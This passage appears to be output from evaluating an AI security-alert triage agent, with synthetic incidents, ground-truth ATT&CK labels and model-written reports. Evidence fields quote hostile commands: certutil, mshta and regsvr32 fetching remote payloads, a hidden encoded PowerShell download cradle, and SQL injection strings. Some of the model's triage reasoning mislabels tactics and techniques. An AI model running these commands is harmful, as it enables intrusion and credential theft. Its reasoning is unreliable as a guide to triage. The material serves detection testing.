+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity alert has been triggered on the db-prod-01 host due to suspicious activity involving the execution of the certutil.exe binary, which is a known living-off-the-land binary. The binary is being used to download a file from a C2-associated port, indicating potential malware activity.",
+        "threat_type": "Lateral Movement",
+        "recommended_action": "Investigate the db-prod-01 host for signs of malware infection and potential data exfiltration. Review the system logs for any further suspicious activity.",
+        "confidence_score": 0.85,
+        "reasoning": "The alert involves the execution of a living-off-the-land binary, which is a common tactic used by attackers to evade detection. The connection to a C2-associated port further indicates potential malware activity.",
+        "processed_at": "2026-08-07T19:21:10.901105",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "192.0.2.244"
+          ],
+          "hosts": [
+            "db-prod-01"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [
+            "4444"
+          ],
+          "text": "[HIGH] Living-off-the-land binary abuse on host:db-prod-01. Detections: Connection to known C2-associated port, Living-off-the-land binary abuse. MITRE ATT&CK techniques tagged by detector: T1218, T1571. [db-prod-01] certutil.exe -urlcache -split -f http://192.0.2.244/stage2.bin s2.bin"
+        }
+      }
+    },
+    {
+      "incident_id": "inc_7f4d118a1c18",
+      "entity": "host:backup-srv-05",
+      "rule_ids": [
+        "NET-C2-PORT-001"
+      ],
+      "ground_truth_mitre": [
+        "T1571"
+      ],
+      "report": {
+        "alert_id": "inc_7f4d118a1c18",
+        "severity_assessment": "MEDIUM",
+        "threat_summary": "A potential command and control (C2) communication has been detected on the host backup-srv-05, indicating possible malicious activity.",
+        "threat_type": "Command and Control (C2) activity",
+        "recommended_action": "Investigate the host backup-srv-05 for signs of malware or unauthorized access, and review system logs for further context.",
+        "confidence_score": 0.8,
+        "reasoning": "The detection of a connection to a known C2-associated port (5555) on the host backup-srv-05, coupled with the presence of MITRE ATT&CK technique T1571, suggests a potential C2 communication. However, the unknown protocol and lack of payload snippet reduce the confidence score.",
+        "processed_at": "2026-08-07T19:21:16.427201",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "192.0.2.204"
+          ],
+          "hosts": [
+            "backup-srv-05"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [
+            "5555"
+          ],
+          "text": "[MEDIUM] Connection to known C2-associated port on host:backup-srv-05. Detections: Connection to known C2-associated port. MITRE ATT&CK techniques tagged by detector: T1571."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_a33471a3743c",
+      "entity": "host:fin-ops-06",
+      "rule_ids": [
+        "PROC-LOLBIN-001"
+      ],
+      "ground_truth_mitre": [
+        "T1218"
+      ],
+      "report": {
+        "alert_id": "inc_a33471a3743c",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity alert has been triggered on host fin-ops-06 due to Living-off-the-land binary abuse, specifically the use of mshta.exe to execute a malicious HTA file.",
+        "threat_type": "Lateral Movement",
+        "recommended_action": "Investigate the host fin-ops-06 for signs of further malicious activity and consider isolating the host from the network.",
+        "confidence_score": 0.9,
+        "reasoning": "The use of mshta.exe to execute a malicious HTA file is a known tactic used by attackers to execute PowerShell commands, indicating a potential lateral movement attempt. The presence of MITRE ATT&CK technique T1218 further supports this assessment.",
+        "processed_at": "2026-08-07T19:21:23.152084",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [],
+          "hosts": [
+            "fin-ops-06"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] Living-off-the-land binary abuse on host:fin-ops-06. Detections: Living-off-the-land binary abuse. MITRE ATT&CK techniques tagged by detector: T1218. [fin-ops-06] mshta.exe http://192.0.2.26/loader.hta"
+        }
+      }
+    },
+    {
+      "incident_id": "inc_9450f1a2ba38",
+      "entity": "host:ws-dev-03",
+      "rule_ids": [
+        "NET-EXFIL-001"
+      ],
+      "ground_truth_mitre": [
+        "T1048"
+      ],
+      "report": {
+        "alert_id": "inc_9450f1a2ba38",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A large outbound transfer to an external host was detected on the ws-dev-03 host, indicating potential data exfiltration.",
+        "threat_type": "Data Exfiltration",
+        "recommended_action": "Investigate the ws-dev-03 host for potential unauthorized data transfer and review system logs for further context.",
+        "confidence_score": 0.85,
+        "reasoning": "The detection of a large outbound transfer to an external host on a non-standard port (21) and the presence of MITRE ATT&CK technique T1048 (Exfiltration Over Command and Control Channel) suggest a potential data exfiltration attempt.",
+        "processed_at": "2026-08-07T19:21:27.597592",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "192.0.2.170"
+          ],
+          "hosts": [
+            "ws-dev-03"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [
+            "21"
+          ],
+          "text": "[HIGH] Large outbound transfer to external host on host:ws-dev-03. Detections: Large outbound transfer to external host. MITRE ATT&CK techniques tagged by detector: T1048."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_98c6c13e64f0",
+      "entity": "host:ws-dev-02",
+      "rule_ids": [
+        "NET-C2-PORT-001"
+      ],
+      "ground_truth_mitre": [
+        "T1571"
+      ],
+      "report": {
+        "alert_id": "inc_98c6c13e64f0",
+        "severity_assessment": "MEDIUM",
+        "threat_summary": "A potential command and control (C2) communication has been detected on the host ws-dev-02, with a connection to a known C2-associated port 4444.",
+        "threat_type": "Command and Control (C2) activity",
+        "recommended_action": "Investigate the host ws-dev-02 for signs of malware or unauthorized access, and review network traffic for similar connections.",
+        "confidence_score": 0.8,
+        "reasoning": "The detection of a connection to a known C2-associated port, along with the presence of MITRE ATT&CK technique T1571, suggests a potential C2 communication. However, the unknown protocol and lack of payload snippet reduce the confidence score.",
+        "processed_at": "2026-08-07T19:21:33.083898",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "192.0.2.199"
+          ],
+          "hosts": [
+            "ws-dev-02"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [
+            "4444"
+          ],
+          "text": "[MEDIUM] Connection to known C2-associated port on host:ws-dev-02. Detections: Connection to known C2-associated port. MITRE ATT&CK techniques tagged by detector: T1571."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_181d99a48188",
+      "entity": "host:db-prod-08",
+      "rule_ids": [
+        "NET-EXFIL-001"
+      ],
+      "ground_truth_mitre": [
+        "T1048"
+      ],
+      "report": {
+        "alert_id": "inc_181d99a48188",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A large outbound transfer to an external host was detected on the db-prod-08 host, indicating potential data exfiltration.",
+        "threat_type": "Data Exfiltration",
+        "recommended_action": "Investigate the db-prod-08 host for potential unauthorized data transfer and review system logs for further insights.",
+        "confidence_score": 0.85,
+        "reasoning": "The detection of a large outbound transfer to an external host on a production database server is a strong indicator of potential data exfiltration. The presence of MITRE ATT&CK technique T1048, which is related to data transfer, further supports this assessment.",
+        "processed_at": "2026-08-07T19:21:38.505923",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "192.0.2.6"
+          ],
+          "hosts": [
+            "db-prod-08"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [
+            "21"
+          ],
+          "text": "[HIGH] Large outbound transfer to external host on host:db-prod-08. Detections: Large outbound transfer to external host. MITRE ATT&CK techniques tagged by detector: T1048."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_99714cd3ee15",
+      "entity": "src_ip:198.51.100.90",
+      "rule_ids": [
+        "AUTH-SPRAY-001"
+      ],
+      "ground_truth_mitre": [
+        "T1110.003"
+      ],
+      "report": {
+        "alert_id": "inc_99714cd3ee15",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity password spraying attack has been detected originating from IP address 198.51.100.90, targeting multiple accounts.",
+        "threat_type": "Password Spraying",
+        "recommended_action": "Block the source IP address 198.51.100.90 and investigate the affected accounts for potential password compromise.",
+        "confidence_score": 0.95,
+        "reasoning": "The detection of password spraying across accounts, coupled with the presence of MITRE ATT&CK technique T1110.003, indicates a targeted and sophisticated attack. The high severity rating and lack of additional context suggest a high confidence in the threat assessment.",
+        "processed_at": "2026-08-07T19:21:43.948399",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "198.51.100.90"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] Password spraying across accounts on src_ip:198.51.100.90. Detections: Password spraying across accounts. MITRE ATT&CK techniques tagged by detector: T1110.003."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_281ce3f82f1e",
+      "entity": "src_ip:203.0.113.64",
+      "rule_ids": [
+        "AUTH-SPRAY-001"
+      ],
+      "ground_truth_mitre": [
+        "T1110.003"
+      ],
+      "report": {
+        "alert_id": "inc_281ce3f82f1e",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity password spraying attack has been detected originating from IP address 203.0.113.64, targeting multiple accounts.",
+        "threat_type": "Password Spray Attack",
+        "recommended_action": "Investigate the source IP address 203.0.113.64 and block it to prevent further unauthorized access.",
+        "confidence_score": 0.9,
+        "reasoning": "The detection of password spraying across accounts, coupled with the presence of MITRE ATT&CK technique T1110.003, indicates a targeted and malicious attack.",
+        "processed_at": "2026-08-07T19:21:49.332391",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "203.0.113.64"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] Password spraying across accounts on src_ip:203.0.113.64. Detections: Password spraying across accounts. MITRE ATT&CK techniques tagged by detector: T1110.003."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_2bbdd6e023ec",
+      "entity": "host:backup-srv-02",
+      "rule_ids": [
+        "NET-EXFIL-001"
+      ],
+      "ground_truth_mitre": [
+        "T1048"
+      ],
+      "report": {
+        "alert_id": "inc_2bbdd6e023ec",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A large outbound transfer to an external host was detected on the backup server backup-srv-02, indicating potential data exfiltration.",
+        "threat_type": "Data Exfiltration",
+        "recommended_action": "Investigate the backup server backup-srv-02 for potential unauthorized data transfer and review system logs for further insights.",
+        "confidence_score": 0.85,
+        "reasoning": "The detection of a large outbound transfer to an external host on a backup server is a strong indicator of potential data exfiltration, which is a common tactic used by attackers to steal sensitive data. The presence of MITRE ATT&CK technique T1048 further supports this assessment.",
+        "processed_at": "2026-08-07T19:21:53.740970",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "192.0.2.28"
+          ],
+          "hosts": [
+            "backup-srv-02"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [
+            "443"
+          ],
+          "text": "[HIGH] Large outbound transfer to external host on host:backup-srv-02. Detections: Large outbound transfer to external host. MITRE ATT&CK techniques tagged by detector: T1048."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_bfd2b3c0d0d3",
+      "entity": "src_ip:203.0.113.240",
+      "rule_ids": [
+        "AUTH-BRUTE-001"
+      ],
+      "ground_truth_mitre": [
+        "T1110"
+      ],
+      "report": {
+        "alert_id": "inc_bfd2b3c0d0d3",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity alert has been triggered due to brute-force logon attempts originating from the source IP 203.0.113.240. This activity is likely an attempt to gain unauthorized access to the network.",
+        "threat_type": "Password Cracking",
+        "recommended_action": "Block the source IP 203.0.113.240 and investigate the potential vulnerabilities that may have led to this attack.",
+        "confidence_score": 0.85,
+        "reasoning": "The presence of MITRE ATT&CK technique T1110 (Brute Force) and the high severity rating indicate a strong likelihood of a password cracking attack. The unknown protocol and port further suggest that this is a targeted attempt to exploit a specific vulnerability.",
+        "processed_at": "2026-08-07T19:21:59.371738",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "203.0.113.240"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] Brute-force logon attempts on src_ip:203.0.113.240. Detections: Brute-force logon attempts. MITRE ATT&CK techniques tagged by detector: T1110."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_e80e7e266dc6",
+      "entity": "host:ws-mktg-08",
+      "rule_ids": [
+        "PROC-LOLBIN-001"
+      ],
+      "ground_truth_mitre": [
+        "T1218"
+      ],
+      "report": {
+        "alert_id": "inc_e80e7e266dc6",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity alert has been triggered on host ws-mktg-08 due to Living-off-the-land binary abuse, indicating potential malicious activity.",
+        "threat_type": "Lateral Movement",
+        "recommended_action": "Investigate the host ws-mktg-08 for signs of compromise and review system logs for further information.",
+        "confidence_score": 0.85,
+        "reasoning": "The presence of certutil.exe decoding a payload from a public directory suggests an attempt to execute malicious code, which is a common tactic in Living-off-the-land binary abuse. The MITRE ATT&CK technique T1218 is also tagged, further supporting this assessment.",
+        "processed_at": "2026-08-07T19:22:04.899550",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [],
+          "hosts": [
+            "ws-mktg-08"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] Living-off-the-land binary abuse on host:ws-mktg-08. Detections: Living-off-the-land binary abuse. MITRE ATT&CK techniques tagged by detector: T1218. [ws-mktg-08] certutil.exe -decode C:\\Users\\Public\\payload.txt payload.exe"
+        }
+      }
+    },
+    {
+      "incident_id": "inc_376e30e812d4",
+      "entity": "host:web-app-01",
+      "rule_ids": [
+        "PROC-LOLBIN-001"
+      ],
+      "ground_truth_mitre": [
+        "T1218"
+      ],
+      "report": {
+        "alert_id": "inc_376e30e812d4",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity alert has been triggered on host web-app-01 due to Living-off-the-land binary abuse, indicating potential malicious activity.",
+        "threat_type": "Lateral Movement",
+        "recommended_action": "Investigate the host web-app-01 for signs of compromise and review system logs for further information.",
+        "confidence_score": 0.85,
+        "reasoning": "The presence of regsvr32.exe with suspicious command-line arguments and a potential registry modification via a script from an unknown source suggests malicious activity. The MITRE ATT&CK technique T1218 further supports this assessment.",
+        "processed_at": "2026-08-07T19:22:11.419077",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [],
+          "hosts": [
+            "web-app-01"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] Living-off-the-land binary abuse on host:web-app-01. Detections: Living-off-the-land binary abuse. MITRE ATT&CK techniques tagged by detector: T1218. [web-app-01] regsvr32.exe /s /n /u /i:http://192.0.2.67/x.sct scrobj.dll"
+        }
+      }
+    },
+    {
+      "incident_id": "inc_c2c9523dc554",
+      "entity": "host:api-gw-02",
+      "rule_ids": [
+        "NET-EXFIL-001"
+      ],
+      "ground_truth_mitre": [
+        "T1048"
+      ],
+      "report": {
+        "alert_id": "inc_c2c9523dc554",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A large outbound transfer was detected from the host api-gw-02 to an external host at IP address 192.0.2.20, indicating potential unauthorized data exfiltration.",
+        "threat_type": "Data Exfiltration",
+        "recommended_action": "Investigate the host api-gw-02 for potential malware or unauthorized access, and review the network traffic to identify the source of the large transfer.",
+        "confidence_score": 0.8,
+        "reasoning": "The detection of a large outbound transfer to an external host, coupled with the tagging of MITRE ATT&CK technique T1048, suggests a potential data exfiltration attempt. The unknown protocol and payload snippet add to the uncertainty, but the high severity and large transfer size indicate a high confidence in the threat.",
+        "processed_at": "2026-08-07T19:22:15.949753",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "192.0.2.20"
+          ],
+          "hosts": [
+            "api-gw-02"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [
+            "22"
+          ],
+          "text": "[HIGH] Large outbound transfer to external host on host:api-gw-02. Detections: Large outbound transfer to external host. MITRE ATT&CK techniques tagged by detector: T1048."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_cda04d393f4f",
+      "entity": "src_ip:203.0.113.166",
+      "rule_ids": [
+        "AUTH-BRUTE-001"
+      ],
+      "ground_truth_mitre": [
+        "T1110"
+      ],
+      "report": {
+        "alert_id": "inc_cda04d393f4f",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity alert has been triggered due to brute-force logon attempts originating from the source IP 203.0.113.166. This indicates a potential unauthorized access attempt.",
+        "threat_type": "Unauthorized Access",
+        "recommended_action": "Block the source IP 203.0.113.166 and investigate further to determine the origin and intent of the attack.",
+        "confidence_score": 0.9,
+        "reasoning": "The alert is triggered by a known MITRE ATT&CK technique (T1110) and has a high severity rating, indicating a high confidence in the accuracy of the alert.",
+        "processed_at": "2026-08-07T19:22:21.429729",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "203.0.113.166"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] Brute-force logon attempts on src_ip:203.0.113.166. Detections: Brute-force logon attempts. MITRE ATT&CK techniques tagged by detector: T1110."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_e41727dc0240",
+      "entity": "host:iot-cam-03",
+      "rule_ids": [
+        "NET-EXFIL-001"
+      ],
+      "ground_truth_mitre": [
+        "T1048"
+      ],
+      "report": {
+        "alert_id": "inc_e41727dc0240",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A large outbound transfer to an external host was detected on the IoT camera device 'iot-cam-03', indicating potential data exfiltration.",
+        "threat_type": "Data Exfiltration",
+        "recommended_action": "Investigate the IoT camera device 'iot-cam-03' for potential malware or unauthorized access, and review network logs for similar activity.",
+        "confidence_score": 0.85,
+        "reasoning": "The detection of a large outbound transfer to an external host on a device with unknown user activity and an unknown protocol suggests a potential data exfiltration attempt, consistent with MITRE ATT&CK technique T1048.",
+        "processed_at": "2026-08-07T19:22:26.874231",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "192.0.2.110"
+          ],
+          "hosts": [
+            "iot-cam-03"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [
+            "21"
+          ],
+          "text": "[HIGH] Large outbound transfer to external host on host:iot-cam-03. Detections: Large outbound transfer to external host. MITRE ATT&CK techniques tagged by detector: T1048."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_826d9938c90b",
+      "entity": "src_ip:198.51.100.98",
+      "rule_ids": [
+        "WEB-SQLI-001"
+      ],
+      "ground_truth_mitre": [
+        "T1190"
+      ],
+      "report": {
+        "alert_id": "inc_826d9938c90b",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity SQL injection pattern has been detected in a web request from IP address 198.51.100.98, indicating a potential vulnerability in the targeted system.",
+        "threat_type": "Web Application Attack",
+        "recommended_action": "Investigate the source IP address 198.51.100.98 and review web application logs for potential SQL injection vulnerabilities.",
+        "confidence_score": 0.85,
+        "reasoning": "The detection of a SQL injection pattern in a web request is a strong indicator of a potential web application attack, and the use of the MITRE ATT&CK technique T1190 further supports this assessment.",
+        "processed_at": "2026-08-07T19:22:32.494268",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "198.51.100.98"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] SQL injection pattern in web request on src_ip:198.51.100.98. Detections: SQL injection pattern in web request. MITRE ATT&CK techniques tagged by detector: T1190. [fin-ops-04] POST /search.php body=q=' UNION SELECT username,password FROM users--"
+        }
+      }
+    },
+    {
+      "incident_id": "inc_4c1dd9e89ba0",
+      "entity": "host:web-app-07",
+      "rule_ids": [
+        "PROC-ENC-PS-001"
+      ],
+      "ground_truth_mitre": [
+        "T1027",
+        "T1059.001"
+      ],
+      "report": {
+        "alert_id": "inc_4c1dd9e89ba0",
+        "severity_assessment": "CRITICAL",
+        "threat_summary": "A critical alert has been triggered on host web-app-07 due to the detection of an encoded PowerShell command, indicating potential malicious activity.",
+        "threat_type": "Lateral Movement",
+        "recommended_action": "Immediately investigate the host web-app-07 and isolate it from the network to prevent further potential damage.",
+        "confidence_score": 0.95,
+        "reasoning": "The presence of an encoded PowerShell command, along with the detection of MITRE ATT&CK techniques T1027 and T1059.001, suggests a potential attempt to move laterally within the network, which warrants a critical severity assessment.",
+        "processed_at": "2026-08-07T19:22:39.017794",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [],
+          "hosts": [
+            "web-app-07"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[CRITICAL] Encoded PowerShell command on host:web-app-07. Detections: Encoded PowerShell command. MITRE ATT&CK techniques tagged by detector: T1027, T1059.001. [web-app-07] powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAwAC4AMgAuADIAMwA1AC8AeAAuAHAAcwAxACcAKQA="
+        }
+      }
+    },
+    {
+      "incident_id": "inc_791a19ac1a88",
+      "entity": "src_ip:203.0.113.52",
+      "rule_ids": [
+        "WEB-SQLI-001"
+      ],
+      "ground_truth_mitre": [
+        "T1190"
+      ],
+      "report": {
+        "alert_id": "inc_791a19ac1a88",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity SQL injection attack has been detected on a web request from IP address 203.0.113.52, attempting to access the login.php page with malicious SQL syntax.",
+        "threat_type": "Web Application Attack",
+        "recommended_action": "Block the source IP address 203.0.113.52 and investigate the web application for potential vulnerabilities.",
+        "confidence_score": 0.95,
+        "reasoning": "The presence of a SQL injection pattern in the web request, specifically the use of malicious SQL syntax in the query string, indicates a high-confidence attack. The detection of this pattern by the security system and the tagging of MITRE ATT&CK technique T1190 further supports this assessment.",
+        "processed_at": "2026-08-07T19:22:44.620125",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "203.0.113.52"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] SQL injection pattern in web request on src_ip:203.0.113.52. Detections: SQL injection pattern in web request. MITRE ATT&CK techniques tagged by detector: T1190. [db-prod-10] GET /login.php?user=admin' OR 1=1--&pass=x"
+        }
+      }
+    },
+    {
+      "incident_id": "inc_b39d83b22bbc",
+      "entity": "src_ip:203.0.113.153",
+      "rule_ids": [
+        "AUTH-BRUTE-001"
+      ],
+      "ground_truth_mitre": [
+        "T1110"
+      ],
+      "report": {
+        "alert_id": "inc_b39d83b22bbc",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity alert has been triggered due to brute-force logon attempts originating from IP address 203.0.113.153, indicating a potential password cracking attack.",
+        "threat_type": "Password Cracking",
+        "recommended_action": "Block the source IP address 203.0.113.153 and investigate the system for potential password compromise.",
+        "confidence_score": 0.9,
+        "reasoning": "The detection of brute-force logon attempts, coupled with the tagging of MITRE ATT&CK technique T1110, suggests a targeted password cracking attack. The high severity rating and lack of additional context indicate a high confidence in the threat assessment.",
+        "processed_at": "2026-08-07T19:22:50.137055",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "203.0.113.153"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] Brute-force logon attempts on src_ip:203.0.113.153. Detections: Brute-force logon attempts. MITRE ATT&CK techniques tagged by detector: T1110."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_a6b814009bd7",
+      "entity": "src_ip:198.51.100.170",
+      "rule_ids": [
+        "AUTH-BRUTE-001",
+        "WEB-SQLI-001"
+      ],
+      "ground_truth_mitre": [
+        "T1110",
+        "T1190"
+      ],
+      "report": {
+        "alert_id": "inc_a6b814009bd7",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A potential SQL injection attack has been detected on a web request from IP address 198.51.100.170, targeting a vulnerable web application.",
+        "threat_type": "Web Application Attack",
+        "recommended_action": "Investigate the source IP address 198.51.100.170 and block it temporarily to prevent further attacks. Review the web application for vulnerabilities and apply necessary patches.",
+        "confidence_score": 0.85,
+        "reasoning": "The detection of a SQL injection pattern in a web request, combined with the presence of MITRE ATT&CK techniques T1110 and T1190, indicates a high likelihood of a targeted attack. The unknown protocol and port further suggest that the attack may be attempting to exploit a zero-day vulnerability.",
+        "processed_at": "2026-08-07T19:22:55.675733",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "198.51.100.170"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
